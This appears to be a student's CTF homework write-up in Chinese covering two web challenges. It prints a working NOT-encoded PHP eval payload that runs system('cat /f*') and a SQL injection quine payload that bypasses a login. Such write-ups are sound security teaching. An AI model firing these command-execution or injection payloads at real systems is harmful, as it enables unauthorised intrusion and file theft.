###### tags: `ctf`
# Hw5 write_up

## ID
bruce30709
## (#°д°)
本題考的是PHP的Weak type，本題的解法是利用not operator去湊出binary相同的字串，只要最後的比對的binary的值是相同的，就會判定為相同，之後就可以去eval()執行指令。

***要注意的是因為有regular expression的限制 必須使用encode後的字串***

我用方法是以下方法去生成encode的字串，有先用ls去測試，最後用cat印出來。
![](https://i.imgur.com/mLSeJnG.png)

最後送出的payload如下，即可拿到flag，此句相當於執行system('cat /f*')。
```htmlembedded=
https://php.splitline.tw/?%28%23%C2%B0%D0%B4%C2%B0%29=
(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%D5);
```
拿到flag啦~

![](https://i.imgur.com/3wrUhnA.png)


## VISUAL BASIC 2077
本題前半部是使用SQL injection去解，但跟之前不同的是，是比對SQL語句查詢後的值，和輸入post的input去比對，所以要使用助教的hint，用quine的句子去構建SQL語句，我是上網查到的句子，然後在本地端測試，發現要用union把欄位設成一樣才能成功查詢，而且要用\-\-也就是SQL的註解，把後面password的部分註解掉(因為已經有在as那給定值了)，以下是我的payload。

登入後還有一點要注意的就是要使用{flag.flag}去拿class裡面的flag!
```sql=
username:{flag.flag}' UNION SELECT REPLACE(REPLACE('{flag.flag}"
UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")
AS username,"a" AS password--',CHAR(34),CHAR(39)),CHAR(36),'{flag.flag}"
UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")
AS username,"a" AS password--') AS username,'a' AS password--

password:a
```
得到flag了!

![](https://i.imgur.com/EUt7g6T.png)

***助教如果要測試payload用vs2077.txt的，因為md的break字元會造成失敗~***